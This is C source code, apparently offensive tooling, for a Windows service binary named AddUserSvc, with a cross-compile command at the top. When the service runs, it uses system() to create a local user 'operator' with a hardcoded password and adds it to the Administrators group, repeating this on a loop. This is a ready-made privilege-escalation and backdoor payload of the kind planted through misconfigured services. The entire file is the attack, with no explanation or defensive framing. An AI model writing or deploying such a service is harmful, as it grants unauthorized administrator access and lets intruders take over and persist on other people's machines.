// x86_64-w64-mingw32-gcc -mwindows -municode -O2 -s -o AddUserSvc.exe AddUserSvc.c

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define SERVICE_NAME L"AddUserSvc"

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;

void UserAdd(void) {
	system("net user operator MonsterKill.1337 /add");
	system("net localgroup Administrators operator /add");
}

void ServiceControlHandler(DWORD control) {
	switch (control) {
		case SERVICE_CONTROL_PAUSE:
			ServiceStatus.dwCurrentState = SERVICE_PAUSED;
			break;
		case SERVICE_CONTROL_CONTINUE:
			ServiceStatus.dwCurrentState = SERVICE_RUNNING;
			break;
		case SERVICE_CONTROL_STOP:
		case SERVICE_CONTROL_SHUTDOWN:
			ServiceStatus.dwCurrentState = SERVICE_STOPPED;
			break;
	}
	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
}

void ServiceMain(DWORD argc, LPWSTR *argv) {
	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	ServiceStatus.dwWin32ExitCode = NO_ERROR ;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;

	ServiceStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceControlHandler);
	if (ServiceStatusHandle == 0)
		return;

	if (SetServiceStatus(ServiceStatusHandle, &ServiceStatus) == 0)
		return;
	
	while (ServiceStatus.dwCurrentState != SERVICE_STOPPED) {
		Sleep(5000);
		if (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
			UserAdd();
			Sleep(1000000);
	}
}

int wWinMain(HINSTANCE instance, HINSTANCE previnstance, LPWSTR cmdline, int showcmd) {
	SERVICE_TABLE_ENTRY StartTable[] = {{SERVICE_NAME, ServiceMain}, {NULL, NULL}};
	StartServiceCtrlDispatcher(StartTable);
	return 0;
}
